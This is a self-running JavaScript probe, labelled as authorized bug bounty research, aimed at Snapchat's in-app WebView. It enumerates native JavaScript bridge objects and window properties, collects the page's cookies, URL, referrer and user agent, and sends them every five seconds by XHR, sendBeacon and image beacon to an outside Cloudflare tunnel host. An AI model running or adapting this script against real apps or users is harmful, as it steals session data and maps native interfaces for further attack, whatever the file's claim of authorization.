/* Snapchat WebView probe. Authorized bug bounty research (HackerOne: snapchat). */
(function () {
  var LOG = (window.SCP_LOG || "https://expense-summit-institute-roads.trycloudflare.com") + "/log";
  var TAG = window.SCP_TAG || "A";
  var NAMES = ["JSBridge","WebJSBridge","SnapAdPerfMarker","SCGhostWriterAndroidBridge",
   "SCGhostWriterBridge","AmazonShopExternalInterfaceHandler","ChatHtmlFullscreenAutoPlay",
   "AutofillJsBridge","AndroidBridge","StorageBridge","RenderBridge","ScPlayableAd",
   "MRAID_NATIVE","SCDynimacBridge","snapWebLensBridge","mobileCheckoutSdk",
   "get_html_body_height_handler","__snapAdPerfMarkerInjected","mraid",
   "snap","Snap","Snapchat","SnapKit","cognac","Cognac","SCCognacBridge","snapCanvas",
   "CanvasBridge","SnapAdBridge","NativeBridge","Android","AndroidInterface","JSInterface",
   "SCWebViewBridge","SnapchatBridge","ComposerBridge","ValdiBridge"];
  function probeNames() {
    var out = {};
    for (var i = 0; i < NAMES.length; i++) {
      var n = NAMES[i], v;
      try { v = window[n]; } catch (e) { out[n] = "THREW:" + e; continue; }
      if (typeof v === "undefined") continue;
      var keys = [];
      try { for (var k in v) { keys.push(k + ":" + (typeof v[k])); } } catch (e) { keys.push("ENUMFAIL"); }
      out[n] = { type: typeof v, keys: keys };
    }
    return out;
  }
  function ownProps() {
    var a = [];
    try { a = Object.getOwnPropertyNames(window); } catch (e) { a = ["GOPN_FAILED"]; }
    a.sort(); return a;
  }
  function bridgeShaped() {
    var hits = [], names;
    try { names = Object.getOwnPropertyNames(window); } catch (e) { return ["GOPN_FAILED"]; }
    for (var i = 0; i < names.length; i++) {
      var n = names[i], v;
      if (/^(on|webkit)/.test(n)) continue;
      try { v = window[n]; } catch (e) { continue; }
      if (!v || typeof v !== "object") continue;
      var ks = [];
      try { for (var k in v) ks.push(k); } catch (e) { continue; }
      if (!ks.length || ks.length > 60) continue;
      var allFn = true, anyNative = false;
      for (var j = 0; j < ks.length; j++) {
        var f;
        try { f = v[ks[j]]; } catch (e) { allFn = false; break; }
        if (typeof f !== "function") { allFn = false; break; }
        try { if (/\[native code\]/.test(Function.prototype.toString.call(f))) anyNative = true; } catch (e) {}
      }
      if (allFn && anyNative) hits.push({ name: n, keys: ks });
    }
    return hits;
  }
  function payload(tag) {
    return { tag: tag, href: location.href, origin: location.origin, ua: navigator.userAgent,
      cookie: (function () { try { return document.cookie; } catch (e) { return "THREW"; } })(),
      referrer: document.referrer, hasOpener: !!window.opener, isTop: window === window.top,
      frames: window.length, named: probeNames(), shaped: bridgeShaped(),
      nprops: ownProps().length, props: ownProps(), ts: new Date().toISOString() };
  }
  function send(p) {
    var s = JSON.stringify(p);
    try { var x = new XMLHttpRequest(); x.open("POST", LOG, true);
          x.setRequestHeader("Content-Type", "text/plain"); x.send(s); } catch (e) {}
    try { navigator.sendBeacon && navigator.sendBeacon(LOG, s); } catch (e) {}
    try { new Image().src = LOG + "?b=" + encodeURIComponent(s.slice(0, 1500)) + "&r=" + Math.random(); } catch (e) {}
    var pre = document.getElementById("out");
    if (pre) { var lite = JSON.parse(s); delete lite.props; pre.textContent = JSON.stringify(lite, null, 1); }
  }
  window.SCP_REPORT = function (tag) { send(payload(tag || TAG)); };
  send(payload(TAG + "-load"));
  var n = 0;
  setInterval(function () { n++; send(payload(TAG + "-tick" + n)); }, 5000);
})();
